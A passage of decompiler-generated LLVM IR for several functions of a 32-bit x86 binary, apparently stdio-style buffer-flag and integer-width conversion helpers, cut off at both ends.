  %v0_804fcc8 = load i32, i32* @ebx, align 4
  %v1_804fcc8 = add i32 %v0_804fcc8, 16
  %v2_804fcc8 = inttoptr i32 %v1_804fcc8 to i32*
  %v3_804fcc8 = load i32, i32* %v2_804fcc8, align 4
  %v4_804fcc8 = load i32, i32* @esi, align 4
  %v5_804fcc8 = add i32 %v4_804fcc8, %v3_804fcc8
  store i32 %v5_804fcc8, i32* %v2_804fcc8, align 4
  br label %dec_label_pc_804fd72

dec_label_pc_804fcd3:                             ; preds = %dec_label_pc_804fca9
  %v6_804fcd7 = icmp ult i32 %v2_804fcd3, %arg2
  br i1 %v6_804fcd7, label %dec_label_pc_804fd41, label %dec_label_pc_804fcd9

dec_label_pc_804fcd9:                             ; preds = %dec_label_pc_804fcd3
  %v0_804fcd9 = load i32, i32* @ecx, align 4
  %v3_804fcdd = inttoptr i32 %v3_804fcad to i16*
  %v4_804fcdd = call i32 @function_804d150(i16* %v3_804fcdd, i32 %arg2, i32 %v0_804fcd9)
  store i32 %v4_804fcdd, i32* %eax.global-to-local, align 4
  %v0_804fce2 = load i32, i32* @ebx, align 4
  %v1_804fce2 = add i32 %v0_804fce2, 16
  %v2_804fce2 = inttoptr i32 %v1_804fce2 to i32*
  %v3_804fce2 = load i32, i32* %v2_804fce2, align 4
  %v4_804fce2 = load i32, i32* @edi, align 4
  %v5_804fce2 = add i32 %v4_804fce2, %v3_804fce2
  store i32 %v5_804fce2, i32* %v2_804fce2, align 4
  %v0_804fce8 = load i32, i32* @ebx, align 4
  %v1_804fce8 = add i32 %v0_804fce8, 1
  %v2_804fce8 = inttoptr i32 %v1_804fce8 to i8*
  %v3_804fce8 = load i8, i8* %v2_804fce8, align 1
  %v4_804fce8 = urem i8 %v3_804fce8, 2
  %v5_804fce8 = icmp eq i8 %v4_804fce8, 0
  br i1 %v5_804fce8, label %dec_label_pc_804fd72, label %dec_label_pc_804fcf2

dec_label_pc_804fcf2:                             ; preds = %dec_label_pc_804fcd9
  %v0_804fcf2 = load i32, i32* @edx, align 4
  %v0_804fcf3 = load i32, i32* @edi, align 4
  %v4_804fcf7 = call i32 @function_8050698(i8 10, i32 %v0_804fcf3, i32 %v0_804fcf2)
  store i32 %v4_804fcf7, i32* %eax.global-to-local, align 4
  %v1_804fcff = icmp eq i32 %v4_804fcf7, 0
  br i1 %v1_804fcff, label %dec_label_pc_804fd72, label %dec_label_pc_804fd03

dec_label_pc_804fd03:                             ; preds = %dec_label_pc_804fcf2
  %v0_804fd06 = load i32, i32* @ebx, align 4
  %v1_804fd07 = call i32 @function_804bf78(i32 %v0_804fd06)
  store i32 %v1_804fd07, i32* %eax.global-to-local, align 4
  %v1_804fd0f = icmp eq i32 %v1_804fd07, 0
  br i1 %v1_804fd0f, label %dec_label_pc_804fd72, label %dec_label_pc_804fd13

dec_label_pc_804fd13:                             ; preds = %dec_label_pc_804fd03
  %v0_804fd13 = load i32, i32* @edi, align 4
  %tmp23 = icmp ugt i32 %v0_804fd13, %v1_804fd07
  br i1 %tmp23, label %dec_label_pc_804fd19, label %dec_label_pc_804fd1b

dec_label_pc_804fd19:                             ; preds = %dec_label_pc_804fd13
  br label %dec_label_pc_804fd1b

dec_label_pc_804fd1b:                             ; preds = %dec_label_pc_804fd13, %dec_label_pc_804fd19
  %storemerge24 = phi i32 [ %v1_804fd07, %dec_label_pc_804fd19 ], [ %v0_804fd13, %dec_label_pc_804fd13 ]
  %v0_804fd22 = phi i32 [ %v1_804fd07, %dec_label_pc_804fd19 ], [ %v0_804fd13, %dec_label_pc_804fd13 ]
  store i32 %storemerge24, i32* %esi.global-to-local, align 4
  %v2_804fd1d = sub i32 %v0_804fd13, %v0_804fd22
  store i32 %v2_804fd1d, i32* %eax.global-to-local, align 4
  %v0_804fd1f = load i32, i32* @ebp, align 4
  %v2_804fd1f = add i32 %v0_804fd1f, %v2_804fd1d
  store i32 %v2_804fd1f, i32* %ebp.global-to-local, align 4
  %v4_804fd26 = call i32 @function_8050628(i8* inttoptr (i32 10 to i8*), i32 %v0_804fd22, i32 %v2_804fd1d)
  store i32 %v4_804fd26, i32* %eax.global-to-local, align 4
  store i32 %v4_804fd26, i32* @edx, align 4
  %v1_804fd30 = icmp eq i32 %v4_804fd26, 0
  br i1 %v1_804fd30, label %dec_label_pc_804fd72, label %dec_label_pc_804fd34

dec_label_pc_804fd34:                             ; preds = %dec_label_pc_804fd1b
  %v0_804fd34 = load i32, i32* %ebp.global-to-local, align 4
  %v1_804fd34 = load i32, i32* %esi.global-to-local, align 4
  %v2_804fd34 = sub i32 %v0_804fd34, %v4_804fd26
  %v2_804fd38 = add i32 %v2_804fd34, %v1_804fd34
  store i32 %v2_804fd38, i32* %eax.global-to-local, align 4
  %v0_804fd3a = load i32, i32* @ebx, align 4
  %v1_804fd3a = add i32 %v0_804fd3a, 16
  %v2_804fd3a = inttoptr i32 %v1_804fd3a to i32*
  %v3_804fd3a = load i32, i32* %v2_804fd3a, align 4
  %v5_804fd3a = sub i32 %v3_804fd3a, %v2_804fd38
  store i32 %v5_804fd3a, i32* %v2_804fd3a, align 4
  %v0_804fd3d = load i32, i32* @edi, align 4
  %v1_804fd3d = load i32, i32* %eax.global-to-local, align 4
  %v2_804fd3d = sub i32 %v0_804fd3d, %v1_804fd3d
  store i32 %v2_804fd3d, i32* @edi, align 4
  br label %dec_label_pc_804fd72

dec_label_pc_804fd41:                             ; preds = %dec_label_pc_804fcd3
  %v2_804fd41 = add i32 %arg3, 8
  %v3_804fd41 = inttoptr i32 %v2_804fd41 to i32*
  %v4_804fd41 = load i32, i32* %v3_804fd41, align 4
  %v15_804fd41 = icmp eq i32 %v3_804fcad, %v4_804fd41
  br i1 %v15_804fd41, label %dec_label_pc_804fd5a, label %dec_label_pc_804fd46

dec_label_pc_804fd46:                             ; preds = %dec_label_pc_804fd41
  %v1_804fd4a = call i32 @function_804bf78(i32 %arg3)
  store i32 %v1_804fd4a, i32* %eax.global-to-local, align 4
  %v1_804fd52 = icmp eq i32 %v1_804fd4a, 0
  br i1 %v1_804fd52, label %dec_label_pc_804fd46.dec_label_pc_804fd5a_crit_edge, label %dec_label_pc_804fd56

dec_label_pc_804fd46.dec_label_pc_804fd5a_crit_edge: ; preds = %dec_label_pc_804fd46
  %v0_804fd5a.pre = load i32, i32* @edi, align 4
  %v0_804fd62.pre = load i32, i32* @ebx, align 4
  %v2_804fd69.pre = load i32, i32* %stack_var_-16, align 4
  br label %dec_label_pc_804fd5a

dec_label_pc_804fd56:                             ; preds = %dec_label_pc_804fd46
  store i32 0, i32* @edi, align 4
  br label %dec_label_pc_804fd72

dec_label_pc_804fd5a:                             ; preds = %dec_label_pc_804fd46.dec_label_pc_804fd5a_crit_edge, %dec_label_pc_804fd41, %dec_label_pc_804fc8c
  %v2_804fd69 = phi i32 [ %v2_804fd69.pre, %dec_label_pc_804fd46.dec_label_pc_804fd5a_crit_edge ], [ %v0_804fc8f, %dec_label_pc_804fd41 ], [ %v0_804fc8f, %dec_label_pc_804fc8c ]
  %v0_804fd62 = phi i32 [ %v0_804fd62.pre, %dec_label_pc_804fd46.dec_label_pc_804fd5a_crit_edge ], [ %arg3, %dec_label_pc_804fd41 ], [ %arg3, %dec_label_pc_804fc8c ]
  %v0_804fd5a = phi i32 [ %v0_804fd5a.pre, %dec_label_pc_804fd46.dec_label_pc_804fd5a_crit_edge ], [ %arg2, %dec_label_pc_804fd41 ], [ %arg2, %dec_label_pc_804fc8c ]
  store i32 %v2_804fd69, i32* @ebx, align 4
  store i32 %v0_804fc8d, i32* @edi, align 4
  %v4_804fd6d = inttoptr i32 %v0_804fd62 to i16*
  %v5_804fd6d = call i32 @function_804fc0c(i16* %v4_804fd6d, i32 %v0_804fd5a, i32 ptrtoint (i32* @0 to i32), i32 ptrtoint (i32* @0 to i32))
  store i32 %v5_804fd6d, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_804fd72

dec_label_pc_804fd72:                             ; preds = %dec_label_pc_804fd1b, %dec_label_pc_804fd03, %dec_label_pc_804fcf2, %dec_label_pc_804fcd9, %dec_label_pc_804fd56, %dec_label_pc_804fd34, %dec_label_pc_804fcbf, %dec_label_pc_804fd5a
  %v0_804fd75 = load i32, i32* @edi, align 4
  store i32 %v0_804fd75, i32* %eax.global-to-local, align 4
  %v2_804fd77 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_804fd77, i32* @ebx, align 4
  store i32 %v0_804fc8e, i32* @esi, align 4
  store i32 %v0_804fc8d, i32* @edi, align 4
  store i32 %v0_804fc8c, i32* @ebp, align 4
  ret i32 %v0_804fd75

; uselistorder directives
  uselistorder i32 %v2_804fd38, { 1, 0 }
  uselistorder i32 %v4_804fd26, { 0, 2, 1, 3 }
  uselistorder i32 %v2_804fd1d, { 1, 0, 2 }
  uselistorder i32 %v0_804fd13, { 3, 0, 1, 2 }
  uselistorder i32 %v2_804fcd3, { 3, 4, 0, 1, 2, 5 }
  uselistorder i32 %v0_804fc8d, { 1, 0 }
  uselistorder i32* %stack_var_-16, { 1, 0, 2 }
  uselistorder i32* %esi.global-to-local, { 1, 0 }
  uselistorder i32* %eax.global-to-local, { 1, 0, 2, 3, 4, 5, 6, 7, 8, 9, 11, 10 }
  uselistorder i32 %arg3, { 0, 1, 2, 3, 5, 4, 6, 8, 7 }
  uselistorder i32 %arg2, { 4, 5, 6, 3, 0, 1, 2, 7 }
  uselistorder label %dec_label_pc_804fd72, { 7, 4, 5, 0, 1, 2, 3, 6 }
  uselistorder label %dec_label_pc_804fd1b, { 1, 0 }
  uselistorder label %dec_label_pc_804fcbf, { 1, 0 }
}

define i32 @function_804fd7c(i16* %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_804fd7c:
  %eax.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %stack_var_-12 = alloca i32, align 4
  %v0_804fd7c = load i32, i32* @ebx, align 4
  %v4_804fd80 = ptrtoint i16* %arg1 to i32
  store i32 %v4_804fd80, i32* @ebx, align 4
  store i32 %arg2, i32* @ecx, align 4
  %v1_804fd88 = bitcast i16* %arg1 to i32*
  %v2_804fd88 = load i32, i32* %v1_804fd88, align 4
  store i32 %v2_804fd88, i32* %eax.global-to-local, align 4
  %v1_804fd8a = urem i32 %v2_804fd88, 65536
  store i32 %v1_804fd8a, i32* %edx.global-to-local, align 4
  %v2_804fd8d = and i32 %v1_804fd8a, %arg2
  %v3_804fd8d = icmp eq i32 %v2_804fd8d, 0
  %v1_804fd8f = icmp eq i1 %v3_804fd8d, false
  br i1 %v1_804fd8f, label %dec_label_pc_804fd9e, label %dec_label_pc_804fd91

dec_label_pc_804fd91:                             ; preds = %dec_label_pc_804fd7c
  %v1_804fd91 = and i32 %v2_804fd88, 2176
  %v2_804fd91 = icmp eq i32 %v1_804fd91, 0
  store i32 %v1_804fd91, i32* %edx.global-to-local, align 4
  %v1_804fd97 = icmp eq i1 %v2_804fd91, false
  br i1 %v1_804fd97, label %dec_label_pc_804fda6, label %dec_label_pc_804fd99

dec_label_pc_804fd99:                             ; preds = %dec_label_pc_804fd91
  %v2_804fd99 = or i32 %v2_804fd88, %arg2
  store i32 %v2_804fd99, i32* %eax.global-to-local, align 4
  %v1_804fd9b = trunc i32 %v2_804fd99 to i16
  store i16 %v1_804fd9b, i16* %arg1, align 2
  %v0_804fd9e.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804fd9e

dec_label_pc_804fd9e:                             ; preds = %dec_label_pc_804fd7c, %dec_label_pc_804fd99
  %v0_804fde3 = phi i32 [ %v4_804fd80, %dec_label_pc_804fd7c ], [ %v0_804fd9e.pre, %dec_label_pc_804fd99 ]
  %v1_804fd9e = inttoptr i32 %v0_804fde3 to i16*
  %v2_804fd9e = load i16, i16* %v1_804fd9e, align 2
  %v3_804fd9e = zext i16 %v2_804fd9e to i32
  store i32 %v3_804fd9e, i32* %edx.global-to-local, align 4
  %v2_804fda1 = and i16 %v2_804fd9e, 32
  %v3_804fda1 = icmp eq i16 %v2_804fda1, 0
  br i1 %v3_804fda1, label %dec_label_pc_804fdba, label %dec_label_pc_804fda6

dec_label_pc_804fda6:                             ; preds = %dec_label_pc_804fd9e, %dec_label_pc_804fd91
  %v1_804fda6 = call i32 @function_804b774(i32 %v0_804fd7c)
  store i32 %v1_804fda6, i32* %eax.global-to-local, align 4
  %v1_804fdab = inttoptr i32 %v1_804fda6 to i32*
  store i32 9, i32* %v1_804fdab, align 4
  br label %dec_label_pc_804fdb1

dec_label_pc_804fdb1:                             ; preds = %dec_label_pc_804fdd1, %dec_label_pc_804fda6
  %v0_804fdb1 = load i32, i32* @ebx, align 4
  %v1_804fdb1 = inttoptr i32 %v0_804fdb1 to i16*
  %v2_804fdb1 = load i16, i16* %v1_804fdb1, align 2
  %v3_804fdb1 = or i16 %v2_804fdb1, 8
  store i16 %v3_804fdb1, i16* %v1_804fdb1, align 2
  store i32 -1, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804fe14

dec_label_pc_804fdba:                             ; preds = %dec_label_pc_804fd9e
  %v2_804fdba = urem i16 %v2_804fd9e, 4
  %v3_804fdba = icmp eq i16 %v2_804fdba, 0
  br i1 %v3_804fdba, label %dec_label_pc_804fe00, label %dec_label_pc_804fdbf

dec_label_pc_804fdbf:                             ; preds = %dec_label_pc_804fdba
  %v2_804fdbf = and i32 %v3_804fd9e, 4
  %v3_804fdbf = icmp eq i32 %v2_804fdbf, 0
  %v1_804fdc2 = icmp eq i1 %v3_804fdbf, false
  br i1 %v1_804fdc2, label %dec_label_pc_804fdf0, label %dec_label_pc_804fdc4

dec_label_pc_804fdc4:                             ; preds = %dec_label_pc_804fdbf
  %v1_804fdc4 = add i32 %v0_804fde3, 20
  %v2_804fdc4 = inttoptr i32 %v1_804fdc4 to i32*
  %v3_804fdc4 = load i32, i32* %v2_804fdc4, align 4
  store i32 %v3_804fdc4, i32* %eax.global-to-local, align 4
  %v2_804fdc7 = add i32 %v0_804fde3, 16
  %v3_804fdc7 = inttoptr i32 %v2_804fdc7 to i32*
  %v4_804fdc7 = load i32, i32* %v3_804fdc7, align 4
  %v15_804fdc7 = icmp eq i32 %v3_804fdc4, %v4_804fdc7
  %v1_804fdca = icmp eq i1 %v15_804fdc7, false
  br i1 %v1_804fdca, label %dec_label_pc_804fdd1, label %dec_label_pc_804fdcc

dec_label_pc_804fdcc:                             ; preds = %dec_label_pc_804fdc4
  %v2_804fdcc = and i32 %v3_804fd9e, 2
  %v3_804fdcc = icmp eq i32 %v2_804fdcc, 0
  br i1 %v3_804fdcc, label %dec_label_pc_804fdf0, label %dec_label_pc_804fdd1

dec_label_pc_804fdd1:                             ; preds = %dec_label_pc_804fdcc, %dec_label_pc_804fdc4
  %v1_804fdd1 = and i32 %v3_804fd9e, 1024
  store i32 %v1_804fdd1, i32* %edx.global-to-local, align 4
  %tmp17 = udiv i32 %v1_804fdd1, 1024
  %tmp18 = xor i32 %tmp17, 3
  store i32 %tmp18, i32* %eax.global-to-local, align 4
  %v5_804fde4 = call i32 @function_8051370(i32 %v0_804fde3, i32 0, i32 %tmp18, i32 %v1_804fdd1)
  store i32 %v5_804fde4, i32* %eax.global-to-local, align 4
  %v1_804fdec = icmp eq i32 %v5_804fde4, 0
  %v1_804fdee = icmp eq i1 %v1_804fdec, false
  br i1 %v1_804fdee, label %dec_label_pc_804fdb1, label %dec_label_pc_804fdd1.dec_label_pc_804fdf0_crit_edge

dec_label_pc_804fdd1.dec_label_pc_804fdf0_crit_edge: ; preds = %dec_label_pc_804fdd1
  %v0_804fdf0.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804fdf0

dec_label_pc_804fdf0:                             ; preds = %dec_label_pc_804fdd1.dec_label_pc_804fdf0_crit_edge, %dec_label_pc_804fdcc, %dec_label_pc_804fdbf
  %v10_804fdf0 = phi i32 [ %v0_804fdf0.pre, %dec_label_pc_804fdd1.dec_label_pc_804fdf0_crit_edge ], [ %v0_804fde3, %dec_label_pc_804fdcc ], [ %v0_804fde3, %dec_label_pc_804fdbf ]
  %v1_804fdf0 = inttoptr i32 %v10_804fdf0 to i16*
  %v2_804fdf0 = load i16, i16* %v1_804fdf0, align 2
  %v3_804fdf0 = and i16 %v2_804fdf0, -4
  store i16 %v3_804fdf0, i16* %v1_804fdf0, align 2
  %v0_804fdf4 = load i32, i32* @ebx, align 4
  %v1_804fdf4 = add i32 %v0_804fdf4, 8
  %v2_804fdf4 = inttoptr i32 %v1_804fdf4 to i32*
  %v3_804fdf4 = load i32, i32* %v2_804fdf4, align 4
  store i32 %v3_804fdf4, i32* %eax.global-to-local, align 4
  %v2_804fdf7 = add i32 %v0_804fdf4, 24
  %v3_804fdf7 = inttoptr i32 %v2_804fdf7 to i32*
  store i32 %v3_804fdf4, i32* %v3_804fdf7, align 4
  %v0_804fdfa = load i32, i32* %eax.global-to-local, align 4
  %v1_804fdfa = load i32, i32* @ebx, align 4
  %v2_804fdfa = add i32 %v1_804fdfa, 16
  %v3_804fdfa = inttoptr i32 %v2_804fdfa to i32*
  store i32 %v0_804fdfa, i32* %v3_804fdfa, align 4
  %v0_804fdfd = load i32, i32* %eax.global-to-local, align 4
  %v1_804fdfd = load i32, i32* @ebx, align 4
  %v2_804fdfd = add i32 %v1_804fdfd, 20
  %v3_804fdfd = inttoptr i32 %v2_804fdfd to i32*
  store i32 %v0_804fdfd, i32* %v3_804fdfd, align 4
  %v0_804fe00.pre = load i32, i32* @ebx, align 4
  br label %dec_label_pc_804fe00

dec_label_pc_804fe00:                             ; preds = %dec_label_pc_804fdba, %dec_label_pc_804fdf0
  %v9_804fe00 = phi i32 [ %v0_804fde3, %dec_label_pc_804fdba ], [ %v0_804fe00.pre, %dec_label_pc_804fdf0 ]
  %v1_804fe00 = inttoptr i32 %v9_804fe00 to i16*
  %v2_804fe00 = load i16, i16* %v1_804fe00, align 2
  %v3_804fe00 = or i16 %v2_804fe00, 64
  store i16 %v3_804fe00, i16* %v1_804fe00, align 2
  store i32 0, i32* %edx.global-to-local, align 4
  %v0_804fe06 = load i32, i32* @ebx, align 4
  %v1_804fe06 = inttoptr i32 %v0_804fe06 to i16*
  %v2_804fe06 = load i16, i16* %v1_804fe06, align 2
  %v3_804fe06 = zext i16 %v2_804fe06 to i32
  store i32 %v3_804fe06, i32* %eax.global-to-local, align 4
  %v3_804fe09 = and i16 %v2_804fe06, 2816
  %v4_804fe09 = icmp eq i16 %v3_804fe09, 0
  %v1_804fe0c = icmp eq i1 %v4_804fe09, false
  br i1 %v1_804fe0c, label %dec_label_pc_804fe14, label %dec_label_pc_804fe0e

dec_label_pc_804fe0e:                             ; preds = %dec_label_pc_804fe00
  %v1_804fe0e = add i32 %v0_804fe06, 12
  %v2_804fe0e = inttoptr i32 %v1_804fe0e to i32*
  %v3_804fe0e = load i32, i32* %v2_804fe0e, align 4
  store i32 %v3_804fe0e, i32* %eax.global-to-local, align 4
  %v2_804fe11 = add i32 %v0_804fe06, 28
  %v3_804fe11 = inttoptr i32 %v2_804fe11 to i32*
  store i32 %v3_804fe0e, i32* %v3_804fe11, align 4
  %v0_804fe14.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_804fe14

dec_label_pc_804fe14:                             ; preds = %dec_label_pc_804fe00, %dec_label_pc_804fdb1, %dec_label_pc_804fe0e
  %v0_804fe14 = phi i32 [ 0, %dec_label_pc_804fe00 ], [ -1, %dec_label_pc_804fdb1 ], [ %v0_804fe14.pre, %dec_label_pc_804fe0e ]
  store i32 %v0_804fe14, i32* %eax.global-to-local, align 4
  %v2_804fe16 = load i32, i32* %stack_var_-12, align 4
  store i32 %v2_804fe16, i32* @edx, align 4
  store i32 %v0_804fd7c, i32* @ebx, align 4
  ret i32 %v0_804fe14

; uselistorder directives
  uselistorder i32 %v0_804fe14, { 1, 0 }
  uselistorder i32 %v0_804fe06, { 1, 0, 2 }
  uselistorder i32 %tmp18, { 1, 0 }
  uselistorder i32 %v1_804fdd1, { 1, 0, 2 }
  uselistorder i32 %v0_804fde3, { 0, 1, 2, 3, 5, 4, 6 }
  uselistorder i32 %v1_804fd8a, { 1, 0 }
  uselistorder i32 %v2_804fd88, { 1, 2, 0, 3 }
  uselistorder i32 %v0_804fd7c, { 1, 0 }
  uselistorder i32 1024, { 0, 11, 3, 9, 7, 12, 4, 1, 2, 5, 10, 6, 8 }
  uselistorder i16* %arg1, { 0, 2, 1 }
  uselistorder label %dec_label_pc_804fe14, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fe00, { 1, 0 }
  uselistorder label %dec_label_pc_804fd9e, { 1, 0 }
}

define i32 @function_804fe1c() local_unnamed_addr {
dec_label_pc_804fe1c:
  %tmp = call i32 @__decompiler_undefined_function_0()
  %tmp3 = call i32 @__decompiler_undefined_function_0()
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %v5_804fe24 = icmp slt i32 %tmp, 0
  %v3_804fe4d = and i32 %tmp4, 2048
  %v4_804fe4d = icmp eq i32 %v3_804fe4d, 0
  br i1 %v5_804fe24, label %dec_label_pc_804fe4d, label %dec_label_pc_804fe2b

dec_label_pc_804fe2b:                             ; preds = %dec_label_pc_804fe1c
  %v1_804fe2e = icmp eq i1 %v4_804fe4d, false
  br i1 %v1_804fe2e, label %dec_label_pc_804fe52, label %dec_label_pc_804fe30

dec_label_pc_804fe30:                             ; preds = %dec_label_pc_804fe2b
  %v1_804fe30 = inttoptr i32 %tmp3 to i32*
  %v2_804fe30 = load i32, i32* %v1_804fe30, align 4
  %v6_804fe32 = icmp eq i32 %tmp4, 256
  %v1_804fe38 = icmp eq i1 %v6_804fe32, false
  br i1 %v1_804fe38, label %dec_label_pc_804fe3f, label %dec_label_pc_804fe3a

dec_label_pc_804fe3a:                             ; preds = %dec_label_pc_804fe30
  %v1_804fe3a = urem i32 %v2_804fe30, 256
  br label %dec_label_pc_804fe4a

dec_label_pc_804fe3f:                             ; preds = %dec_label_pc_804fe30
  %v6_804fe3f = icmp eq i32 %tmp4, 512
  %v1_804fe45 = icmp eq i1 %v6_804fe3f, false
  br i1 %v1_804fe45, label %dec_label_pc_804fe4a, label %dec_label_pc_804fe47

dec_label_pc_804fe47:                             ; preds = %dec_label_pc_804fe3f
  %v1_804fe47 = urem i32 %v2_804fe30, 65536
  br label %dec_label_pc_804fe4a

dec_label_pc_804fe4a:                             ; preds = %dec_label_pc_804fe3f, %dec_label_pc_804fe3a, %dec_label_pc_804fe47
  %v0_804fe4c = phi i32 [ %v2_804fe30, %dec_label_pc_804fe3f ], [ %v1_804fe3a, %dec_label_pc_804fe3a ], [ %v1_804fe47, %dec_label_pc_804fe47 ]
  store i32 0, i32* @edx, align 4
  ret i32 %v0_804fe4c

dec_label_pc_804fe4d:                             ; preds = %dec_label_pc_804fe1c
  br i1 %v4_804fe4d, label %dec_label_pc_804fe58, label %dec_label_pc_804fe52

dec_label_pc_804fe52:                             ; preds = %dec_label_pc_804fe4d, %dec_label_pc_804fe2b
  %v1_804fe52 = add i32 %tmp3, 4
  %v2_804fe52 = inttoptr i32 %v1_804fe52 to i32*
  %v3_804fe52 = load i32, i32* %v2_804fe52, align 4
  store i32 %v3_804fe52, i32* @edx, align 4
  %v1_804fe55 = inttoptr i32 %tmp3 to i32*
  %v2_804fe55 = load i32, i32* %v1_804fe55, align 4
  ret i32 %v2_804fe55

dec_label_pc_804fe58:                             ; preds = %dec_label_pc_804fe4d
  %v1_804fe58 = inttoptr i32 %tmp3 to i32*
  %v2_804fe58 = load i32, i32* %v1_804fe58, align 4
  %v6_804fe5a = icmp eq i32 %tmp4, 256
  %v1_804fe60 = icmp eq i1 %v6_804fe5a, false
  br i1 %v1_804fe60, label %dec_label_pc_804fe67, label %dec_label_pc_804fe62

dec_label_pc_804fe62:                             ; preds = %dec_label_pc_804fe58
  %v1_804fe62 = mul i32 %v2_804fe58, 16777216
  %v2_804fe62 = sdiv i32 %v1_804fe62, 16777216
  br label %dec_label_pc_804fe70

dec_label_pc_804fe67:                             ; preds = %dec_label_pc_804fe58
  %v6_804fe67 = icmp eq i32 %tmp4, 512
  %v1_804fe6d = icmp eq i1 %v6_804fe67, false
  br i1 %v1_804fe6d, label %dec_label_pc_804fe70, label %dec_label_pc_804fe6f

dec_label_pc_804fe6f:                             ; preds = %dec_label_pc_804fe67
  %v1_804fe6f = mul i32 %v2_804fe58, 65536
  %v2_804fe6f = sdiv i32 %v1_804fe6f, 65536
  br label %dec_label_pc_804fe70

dec_label_pc_804fe70:                             ; preds = %dec_label_pc_804fe67, %dec_label_pc_804fe62, %dec_label_pc_804fe6f
  %v0_804fe70 = phi i32 [ %v2_804fe58, %dec_label_pc_804fe67 ], [ %v2_804fe62, %dec_label_pc_804fe62 ], [ %v2_804fe6f, %dec_label_pc_804fe6f ]
  %v1_804fe70 = ashr i32 %v0_804fe70, 31
  store i32 %v1_804fe70, i32* @edx, align 4
  ret i32 %v0_804fe70

; uselistorder directives
  uselistorder i32 %v0_804fe70, { 1, 0 }
  uselistorder i32 %v2_804fe58, { 2, 0, 1 }
  uselistorder i32 %v2_804fe30, { 2, 0, 1 }
  uselistorder i32 %tmp3, { 0, 2, 1, 3 }
  uselistorder label %dec_label_pc_804fe70, { 2, 0, 1 }
  uselistorder label %dec_label_pc_804fe4a, { 2, 0, 1 }
}

define i32 @function_804fe74() local_unnamed_addr {
dec_label_pc_804fe74:
  %ebx.global-to-local = alloca i32, align 4
  %edx.global-to-local = alloca i32, align 4
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %tmp5 = call i16* @__decompiler_undefined_function_4()
  %tmp6 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-4 = alloca i32, align 4
  %v0_804fe74 = load i32, i32* @ebx, align 4
  store i32 %v0_804fe74, i32* %stack_var_-4, align 4
  store i32 %tmp6, i32* @ecx, align 4
  %v4_804fe79 = ptrtoint i16* %tmp5 to i32
  store i32 %v4_804fe79, i32* %ebx.global-to-local, align 4
  %v4_804fe7d = trunc i32 %tmp4 to i16
  %v6_804fe85 = icmp eq i32 %tmp6, 256
  %v1_804fe8b = icmp eq i1 %v6_804fe85, false
  br i1 %v1_804fe8b, label %dec_label_pc_804fe91, label %dec_label_pc_804fe8d

dec_label_pc_804fe8d:                             ; preds = %dec_label_pc_804fe74
  %v2_804fe8d = trunc i32 %tmp4 to i8
  %v4_804fe8d = bitcast i16* %tmp5 to i8*
  store i8 %v2_804fe8d, i8* %v4_804fe8d, align 1
  br label %dec_label_pc_804feaf

dec_label_pc_804fe91:                             ; preds = %dec_label_pc_804fe74
  %v6_804fe91 = icmp eq i32 %tmp6, 2048
  %v1_804fe97 = icmp eq i1 %v6_804fe91, false
  br i1 %v1_804fe97, label %dec_label_pc_804fea0, label %dec_label_pc_804fe99

dec_label_pc_804fe99:                             ; preds = %dec_label_pc_804fe91
  %sext2 = mul i32 %tmp4, 65536
  %v1_804fe99 = sdiv i32 %sext2, 65536
  %v3_804fe99 = bitcast i16* %tmp5 to i32*
  store i32 %v1_804fe99, i32* %v3_804fe99, align 4
  %v0_804fe9b = load i32, i32* %edx.global-to-local, align 4
  %v1_804fe9b = load i32, i32* %ebx.global-to-local, align 4
  %v2_804fe9b = add i32 %v1_804fe9b, 4
  %v3_804fe9b = inttoptr i32 %v2_804fe9b to i32*
  store i32 %v0_804fe9b, i32* %v3_804fe9b, align 4
  br label %dec_label_pc_804feaf

dec_label_pc_804fea0:                             ; preds = %dec_label_pc_804fe91
  %v6_804fea0 = icmp eq i32 %tmp6, 512
  %v1_804fea6 = icmp eq i1 %v6_804fea0, false
  br i1 %v1_804fea6, label %dec_label_pc_804fead, label %dec_label_pc_804fea8

dec_label_pc_804fea8:                             ; preds = %dec_label_pc_804fea0
  store i16 %v4_804fe7d, i16* %tmp5, align 2
  br label %dec_label_pc_804feaf

dec_label_pc_804fead:                             ; preds = %dec_label_pc_804fea0
  %sext3 = mul i32 %tmp4, 65536
  %v1_804fead = sdiv i32 %sext3, 65536
  %v3_804fead = bitcast i16* %tmp5 to i32*
  store i32 %v1_804fead, i32* %v3_804fead, align 4
  br label %dec_label_pc_804feaf

dec_label_pc_804feaf:                             ; preds = %dec_label_pc_804fea8, %dec_label_pc_804fe99, %dec_label_pc_804fe8d, %dec_label_pc_804fead
  %v2_804feaf = load i32, i32* %stack_var_-4, align 4
  store i32 %v2_804feaf, i32* %ebx.global-to-local, align 4
  %sext = mul i32 %tmp4, 65536
  %v1_804feb0 = sdiv i32 %sext, 65536
  ret i32 %v1_804feb0

; uselistorder directives
  uselistorder label %dec_label_pc_804feaf, { 3, 0, 1, 2 }
}

define i32 @function_804feb4(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
dec_label_pc_804feb4:
  %ebp.global-to-local = alloca i32, align 4
  %ebx.global-to-local = alloca i32, align 4
  %ecx.global-to-local = alloca i32, align 4
  %edi.global-to-local = alloca i32, align 4
  %esi.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %esi.global-to-local, align 4
  %v4_804febf = ptrtoint i8* %arg1 to i32
  store i32 %v4_804febf, i32* %edi.global-to-local, align 4
  store i32 %arg2, i32* %ecx.global-to-local, align 4
  store i32 %arg3, i32* %ebx.global-to-local, align 4
  %v2_804fecb = icmp slt i32 %arg4, 0
  %v1_804fecd = icmp eq i1 %v2_804fecb, false
  br i1 %v1_804fecd, label %dec_label_pc_804feee, label %dec_label_pc_804fecf

dec_label_pc_804fecf:                             ; preds = %dec_label_pc_804feb4
  %v1_804fecf = sub i32 0, %arg4
  store i32 %v1_804fecf, i32* %esi.global-to-local, align 4
  %v2_804fed1 = icmp slt i32 %arg3, 0
